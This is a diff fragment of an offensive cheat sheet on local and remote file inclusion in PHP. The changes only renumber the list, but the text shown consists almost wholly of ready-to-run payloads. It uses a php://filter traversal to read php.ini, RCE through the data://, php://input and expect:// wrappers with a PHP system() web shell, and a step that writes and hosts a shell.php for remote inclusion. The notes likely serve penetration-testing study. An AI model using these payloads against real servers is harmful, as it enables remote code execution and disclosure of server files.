@@ -14,9 +14,9 @@ LFI Bypasse
 Remote Code Execution
  PHP Wrappers
 1)  Checking PHP Configurations for allow_url_include   - curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"     
-1)	- RCE with data wrapper     -   /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id                           
-2)	- RCE with input wrapper    -   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"       
-3)	- RCE with expect wrapper   -    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"                                                              
+2)	- RCE with data wrapper     -   /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id                           
+3)	- RCE with input wrapper    -   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"       
+4)	- RCE with expect wrapper   -    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"                                                              
 
 RFI
 1)	- Host web shell                                    -           echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>                     
